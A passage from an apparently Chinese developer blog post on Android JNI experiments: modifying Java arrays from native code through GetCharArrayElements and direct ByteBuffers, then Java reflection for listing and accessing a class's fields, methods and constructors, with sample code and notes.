class="number">4</span>+<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        plainText[ind*<span class="number">3</span>+<span class="number">0</span>] = (n1&lt;&lt;<span class="number">2</span>) + (n2&gt;&gt;<span class="number">4</span>);</span><br><span class="line">        plainText[ind*<span class="number">3</span>+<span class="number">1</span>] = (n2&lt;&lt;<span class="number">4</span>) + (n3&gt;&gt;<span class="number">2</span>);</span><br><span class="line">        plainText[ind*<span class="number">3</span>+<span class="number">2</span>] = (n3&lt;&lt;<span class="number">6</span>) + (n4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cipherText[cipher_lens<span class="number">-1</span>]==<span class="string">&#x27;=&#x27;</span>) plainText[plain_lens<span class="number">-2</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(cipherText[cipher_lens<span class="number">-2</span>]==<span class="string">&#x27;=&#x27;</span>) plainText[plain_lens<span class="number">-3</span>]=<span class="number">0</span>;</span><br><span class="line">    plainText[plain_lens<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//获取解密后的明文plainText,然后赋值给cls.mOutputText</span></span><br><span class="line">    jstr = env-&gt;<span class="built_in">NewStringUTF</span>(plainText);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;BASE64&quot;</span>, <span class="string">&quot;JAVA--&gt;C JNI:plainText=%s&quot;</span>, plainText);</span><br><span class="line">    <span class="keyword">if</span>(jstr == <span class="literal">NULL</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    env-&gt;<span class="built_in">SetObjectField</span>(thiz, outputTextID, jstr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210812095228.png" alt="image-20210812095201973"></p><h2 id="通过GetArrayElements-函数直接修改"><a href="#通过GetArrayElements-函数直接修改" class="headerlink" title="通过GetArrayElements()函数直接修改"></a>通过Get<PrimitiveType>ArrayElements()函数直接修改</h2><p>对于Java的对象，用第一种方法来操纵修改应该是比较方便的。对于一些局部变量，可以考虑向Native层传入地址引用，借助JNIEnv的一些函数来实现无原始数据传输的修改。</p><p>在这里使用Get<PrimitiveType>ArrayElements()这类函数来实现修改。这类函数在JNI手册中介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Get&lt;PrimitiveType&gt;ArrayElements Routines</span><br><span class="line">NativeType *Get&lt;PrimitiveType&gt;ArrayElements(JNIEnv *env, ArrayType array, jboolean *isCopy);</span><br><span class="line"></span><br><span class="line">A family of functions that returns the body of the primitive array. The result is valid until the corresponding Release&lt;PrimitiveType&gt;ArrayElements() function is called. Since the returned array may be a copy of the Java array, changes made to the returned array will not necessarily be reflected in the original array until Release&lt;PrimitiveType&gt;ArrayElements() is called.</span><br><span class="line"></span><br><span class="line">If isCopy is not NULL, then *isCopy is set to JNI_TRUE if a copy is made; or it is set to JNI_FALSE if no copy is made.</span><br><span class="line"></span><br><span class="line">The following table describes the specific primitive array element accessors. You should make the following substitutions:</span><br><span class="line"></span><br><span class="line">Replace Get&lt;PrimitiveType&gt;ArrayElements with one of the actual primitive element accessor routine names from the table.</span><br><span class="line">Replace ArrayType with the corresponding array type.</span><br><span class="line">Replace NativeType with the corresponding native type for that routine.</span><br><span class="line">Regardless of how boolean arrays are represented in the Java VM, GetBooleanArrayElements() always returns a pointer to jbooleans, with each byte denoting an element (the unpacked representation). All arrays of other types are guaranteed to be contiguous in memory.</span><br><span class="line"></span><br><span class="line">PARAMETERS:</span><br><span class="line">env: the JNI interface pointer.</span><br><span class="line">array: a Java string object.</span><br><span class="line">isCopy: a pointer to a boolean.</span><br><span class="line"></span><br><span class="line">RETURNS:</span><br><span class="line">Returns a pointer to the array elements, or NULL if the operation fails.</span><br></pre></td></tr></table></figure><p>以GetCharArrayElements()为例，该函数接收一个jcharArray的指针p和一个用于标识是否拷贝的标志位isCopy。<br>如果isCopy=NULL或者JNI_TRUE，则会在Native层实现一个数组p的拷贝，否则在Native层仅保留该指针而不拷贝。<br>此外，若要使得Native发生的修改在Java层生效，需要在修改操作完成之后使用ReleaseCharArrayElements()，并注意设置mode。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Release&lt;PrimitiveType&gt;ArrayElements Routines</span><br><span class="line">void Release&lt;PrimitiveType&gt;ArrayElements(JNIEnv *env,</span><br><span class="line">ArrayType array, NativeType *elems, jint mode);</span><br><span class="line"></span><br><span class="line">A family of functions that informs the VM that the native code no longer needs access to elems. The elems argument is a pointer derived from array using the corresponding Get&lt;PrimitiveType&gt;ArrayElements() function. If necessary, this function copies back all changes made to elems to the original array.</span><br><span class="line"></span><br><span class="line">The mode argument provides information on how the array buffer should be released. mode has no effect if elems is not a copy of the elements in array. Otherwise, mode has the following impact, as shown in the following table:</span><br><span class="line"></span><br><span class="line">Table 4-10 Primitive Array Release Modes</span><br><span class="line">modeactions</span><br><span class="line">0copy back the content and free the elems buffer</span><br><span class="line">JNI_COMMITcopy back the content but do not free the elems buffer</span><br><span class="line">JNI_ABORTfree the buffer without copying back the possible changes</span><br><span class="line"></span><br><span class="line">In most cases, programmers pass “0” to the mode argument to ensure consistent behavior for both pinned and copied arrays. The other options give the programmer more control over memory management and should be used with extreme care.</span><br><span class="line"></span><br><span class="line">PARAMETERS:</span><br><span class="line">env: the JNI interface pointer.</span><br><span class="line">array: a Java array object.</span><br><span class="line">elems: a pointer to array elements.</span><br><span class="line">mode: the release mode.</span><br></pre></td></tr></table></figure><p>实验代码如下：</p><ol><li>在Java层初始化char[] s = “a1234567890”</li><li>将s传入到Native层，使用env-&gt;GetCharArrayElements()进行修改，调用env-&gt;ReleaseCharArrayElements()提交修改，并适量打印中间结果。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java</span></span><br><span class="line">String ss= <span class="string">&quot;a1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] s = ss.toCharArray();</span><br><span class="line">Log.i(TAG, <span class="string">&quot;before test2change() called, s = &quot;</span> + (<span class="keyword">new</span> String(s)));</span><br><span class="line">test2change(s);<span class="comment">//传入s</span></span><br><span class="line">Log.i(TAG, <span class="string">&quot;after  test2change() called, s = &quot;</span> + (<span class="keyword">new</span> String(s)));</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Native C++</span></span><br><span class="line"><span class="built_in">Java_com_example_devndk_Base64_test2change</span>(JNIEnv *env, jobject thiz, jcharArray str) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement test2change()</span></span><br><span class="line">    jchar * s;</span><br><span class="line">    jint lens;</span><br><span class="line">    s = env-&gt;<span class="built_in">GetCharArrayElements</span>(str, JNI_FALSE);</span><br><span class="line">    <span class="comment">//获取str在Java层的指针，</span></span><br><span class="line">    lens = (<span class="keyword">int</span>) env-&gt;<span class="built_in">GetArrayLength</span>(str);</span><br><span class="line"></span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;BASE64&quot;</span>, <span class="string">&quot;s=%x &amp;s=%x lens=%x &amp;lens=%x **s=%c&quot;</span>, s, &amp;s, lens, &amp;lens, *s);</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;BASE64&quot;</span>, <span class="string">&quot;s is NULL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> ind=<span class="number">0</span>;ind&lt;lens/<span class="number">2</span>;ind++)&#123;</span><br><span class="line">        s[ind] = <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    env-&gt;<span class="built_in">ReleaseCharArrayElements</span>(str, s, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210812210621.png" alt="image-20210812210613220"></p><p>从输出可以看到，Java层s数组最终发生变化，Native的变量s为指向Java层s数组的指针。</p><h3 id="在Java层打印变量的物理地址（待完善）"><a href="#在Java层打印变量的物理地址（待完善）" class="headerlink" title="在Java层打印变量的物理地址（待完善）"></a>在Java层打印变量的物理地址（待完善）</h3><p>事实上，考虑到Java Heap实际上使用的是<a href="https://blog.csdn.net/gemmem/article/details/8920039">虚拟内存</a>的缘故，我对<code>s=b64b2ac0</code>是否真的为Java层s数组的物理地址持有一定的怀疑。<br>所以试图在Java层打印s的物理地址，这是一个非常别扭的想法。<br>找了半天，发现sun.misc.Unsafe这个类可能会有所帮助，于是尝试了一个<a href="https://github.com/iamironz/unsafe">第三方库</a>（因为Android不支持Unsafe）和据说能打印物理地址的<a href="https://stackoverflow.com/questions/1961146/memory-address-of-variables-in-java">脚本</a>。<br>但是发现Java和Native的地址并不相同，此处<strong>有待探讨</strong>，可能是脚本并不能满足要求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试语句</span></span><br><span class="line">String ss= <span class="string">&quot;a1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] s = ss.toCharArray();</span><br><span class="line">printAddresses(<span class="string">&quot;Address of s&quot;</span>, s);</span><br><span class="line">Log.i(TAG, <span class="string">&quot;before test2change() called, s = &quot;</span> + (<span class="keyword">new</span> String(s)));</span><br><span class="line">test2change(s);</span><br><span class="line">Log.i(TAG, <span class="string">&quot;after  test2change() called, s = &quot;</span> + (<span class="keyword">new</span> String(s)));</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要导入预编译的第三方库文件</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printAddresses</span><span class="params">(String label, Object... objects)</span> </span>&#123;</span><br><span class="line">        System.out.print(label + <span class="string">&quot;: 0x&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> last = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> UnsafeAndroid unsafe = <span class="keyword">new</span> UnsafeAndroid();</span><br><span class="line">        <span class="keyword">int</span> offset = unsafe.arrayBaseOffset(objects.getClass());</span><br><span class="line">        <span class="keyword">int</span> scale = unsafe.arrayIndexScale(objects.getClass());</span><br><span class="line">        <span class="keyword">switch</span> (scale) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">long</span> factor = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//                long factor = is64bit ? 8 : 1;</span></span><br><span class="line">                <span class="keyword">final</span> <span class="keyword">long</span> i1 = (unsafe.getInt(objects, offset) &amp; <span class="number">0xFFFFFFFFL</span>) * factor;</span><br><span class="line">                System.out.print(Long.toHexString(i1));</span><br><span class="line">                last = i1;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; objects.length; i++) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="keyword">long</span> i2 = (unsafe.getInt(objects, offset + i * <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFFL</span>) * factor;</span><br><span class="line">                    <span class="keyword">if</span> (i2 &gt; last)</span><br><span class="line">                        System.out.print(<span class="string">&quot;, +&quot;</span> + Long.toHexString(i2 - last));</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        System.out.print(<span class="string">&quot;, -&quot;</span> + Long.toHexString( last - i2));</span><br><span class="line">                    last = i2;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">&quot;Not supported&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210812212757.png" alt="image-20210812212750699"></p><h2 id="通过Direct-ByteBuffer修改"><a href="#通过Direct-ByteBuffer修改" class="headerlink" title="通过Direct ByteBuffer修改"></a>通过Direct ByteBuffer修改</h2><p>有位<a href="https://www.cnblogs.com/heitao/p/7271378.html">老哥</a>说他用GetCharArrayElements()方法没有成功修改，阅读他的代码之后感觉是因为没有调用ReleaseCharArrayElements()提交修改导致的。不过他顺便提到了第三种修改的方法–ByteBuffer。</p><p>ByteBuffer在内存中预留指定大小的存储空间作为IO数据的临时存储，主要还是用于优化内存性能，同样可以避免在Native拷贝数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] d = &#123;<span class="number">97</span>,<span class="number">97</span>,<span class="number">97</span>,<span class="number">97</span>&#125;;</span><br><span class="line">    Log.i(TAG, <span class="string">&quot;d=&quot;</span> + (<span class="keyword">new</span> String(d)));</span><br><span class="line">    ByteBuffer input_buffer = ByteBuffer.allocateDirect(d.length);</span><br><span class="line">    input_buffer.put(d);</span><br><span class="line"></span><br><span class="line">    printAddresses(<span class="string">&quot;Address input_buffer:&quot;</span>, input_buffer);<span class="comment">//见上文</span></span><br><span class="line"></span><br><span class="line">    test(input_buffer);</span><br><span class="line"></span><br><span class="line">    input_buffer.flip(); <span class="comment">//改变缓存区的读写状态</span></span><br><span class="line">    input_buffer.get(d);</span><br><span class="line"></span><br><span class="line">    Log.i(TAG, <span class="string">&quot;d=&quot;</span> + (<span class="keyword">new</span> String(d)));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// c++</span></span><br><span class="line"><span class="built_in">Java_com_example_devndk_Base64_test</span>(JNIEnv *env, jobject thiz, jobject i) &#123;</span><br><span class="line">    <span class="keyword">int</span> iBufferSize = env-&gt;<span class="built_in">GetDirectBufferCapacity</span>(i);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;BASE64&quot;</span>, <span class="string">&quot;iBufferSize = %d&quot;</span>, iBufferSize);</span><br><span class="line">    <span class="keyword">char</span> *iBuffer = (<span class="keyword">char</span> *)env-&gt;<span class="built_in">GetDirectBufferAddress</span>(i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(iBuffer != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;BASE64&quot;</span>, <span class="string">&quot;iBuffer=%x *iBuffer=%c&quot;</span>, iBuffer, *iBuffer);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;iBufferSize;i++)&#123;</span><br><span class="line">            iBuffer[i]=<span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;BASE64&quot;</span>, <span class="string">&quot;iBuffer = NULL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210813102941.png" alt="image-20210813102723917"></p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="学习反射"><a href="#学习反射" class="headerlink" title="学习反射"></a>学习反射</h2><p>笔者含泪推荐<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512">廖雪峰</a>的教程，他从开发的角度出发，讲得非常详细且全面。<br>在这里简单记录一下我看了其他文章没有理解到却在廖雪峰处学会了的知识点，然后是实验代码</p><p><a href="https://docs.oracle.com/javase/10/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible(boolean)">setAccessible(true)</a>并不是修改目标字段的访问权限，而是试图不进行安全检查访问目标字段。如果此时存在安全检查，则setAccessible可能失败。</p><p>关于几个获取Method和Field的函数的区别。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">- Field getField(name)：根据字段名获取某个public的field（包括父类）</span><br><span class="line">- Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</span><br><span class="line">- Field[] getFields()：获取所有public的field（包括父类）</span><br><span class="line">- Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）</span><br><span class="line"></span><br><span class="line">- Method getMethod(name, Class...)：获取某个public的Method（包括父类）</span><br><span class="line">- Method getDeclaredMethod(name, Class...)：获取当前类的某个Method（不包括父类）</span><br><span class="line">- Method[] getMethods()：获取所有public的Method（包括父类）</span><br><span class="line">- Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类）</span><br><span class="line"></span><br><span class="line">- Constructor getConstructor(Class...)：获取某个public的Constructor；</span><br><span class="line">- Constructor getDeclaredConstructor(Class...)：获取某个Constructor；</span><br><span class="line">- Constructor[] getConstructors()：获取所有public的Constructor；</span><br><span class="line">- Constructor[] getDeclaredConstructors()：获取所有Constructor</span><br></pre></td></tr></table></figure><p>使用上述函数编写一个函数用于打印目标类的相关信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ClassInfo</span><span class="params">(String ClassName)</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Class cls = Class.forName(ClassName);</span><br><span class="line">        Object obj = cls.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印目标类的所有field method constructor</span></span><br><span class="line">        Field[] allClassFields = cls.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f: allClassFields)&#123;</span><br><span class="line">            System.out.println(ClassName + <span class="string">&quot;: PublicField - &quot;</span> + f.getName() + <span class="string">&quot;=&quot;</span> + f.get(obj) + <span class="string">&quot;(&quot;</span> + f.getType() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] allClassDeclaredFields = cls.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f: allClassDeclaredFields)&#123;</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            System.out.println(ClassName + <span class="string">&quot;: DeclaredField - &quot;</span> + f.getName() + <span class="string">&quot;=&quot;</span> + f.get(obj) + <span class="string">&quot;(&quot;</span> + f.getType() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Constructor[] allClassConstructors = cls.getConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor c: allClassConstructors)&#123;</span><br><span class="line">            System.out.println(ClassName + <span class="string">&quot;: PublicConstructor - &quot;</span> + c.getName() + <span class="string">&quot;(&quot;</span> + c.getParameterTypes().toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor[] allClassDeclaredConstructors = cls.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor c: allClassDeclaredConstructors)&#123;</span><br><span class="line">            c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            System.out.println(ClassName + <span class="string">&quot;: DeclaredConstructor - &quot;</span> + c.getName() + <span class="string">&quot;(&quot;</span> + c.getParameterTypes().toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Method[] allClassMethods = cls.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m: allClassMethods)&#123;</span><br><span class="line">            System.out.println(ClassName + <span class="string">&quot;: PublicMethod - &quot;</span> + m.getName() + <span class="string">&quot;(&quot;</span> + m.getParameterTypes().toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Method[] allClassDeclaredMethods = cls.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m: allClassDeclaredMethods)&#123;</span><br><span class="line">            m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            System.out.println(ClassName + <span class="string">&quot;: DeclaredMethod - &quot;</span> + m.getName() + <span class="string">&quot;(&quot;</span> + m.getParameterTypes().toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;Error : ClassNotFoundException&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;Unknown Exception&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为需要使用方法签名确定具体调用哪个方法，所以便捷而准确地或者各个方法的签名会有利工作推进。<br>可以使用Java命令来获取一个类的所有方法的签名，步骤如下：</p><ol><li>打开工作目录<code>APPNAME\app\build\intermediates\javac\debug\classes</code>，同时<code>make project</code>。（Android Studio Ctrl+F9即可）</li><li>命令行 <code>javac -s -p com.example.xxx</code></li></ol><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210814173039.png" alt="image-20210814172949102"></p><p>常用类型的对照表如下</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210814213356.png" alt="image-20210814213352336"></p><p>同时，javap的参数规范如下</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210814173036.png" alt="image-20210814173029942"></p><p>用于测试的目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionClass</span> <span class="keyword">extends</span> <span class="title">SuperReflectionClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String TAG = <span class="string">&quot;ReflectionClass&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String subStr = <span class="string">&quot;ReflectionStr&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String priStr = <span class="string">&quot;private string&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> priInt = <span class="number">123456</span>;</span><br><span class="line">    <span class="keyword">public</span> String pubStr = <span class="string">&quot;public string&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">priMtd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;priMtd() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">priMtd</span><span class="params">(String p)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;p = &quot;</span> + p + <span class="string">&quot;, priStr=&quot;</span> + <span class="keyword">this</span>.priStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;priMtd(String p) called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pubMtd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;pubMtd() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReflectionClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subStr = <span class="string">&quot;this is the &quot;</span> + <span class="keyword">this</span>.subStr;</span><br><span class="line">        System.out.println(<span class="string">&quot;ReflectionClass() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReflectionClass</span><span class="params">(String priStr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.priStr = priStr;</span><br><span class="line">        System.out.println(<span class="string">&quot;ReflectionClass(String priStr) called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 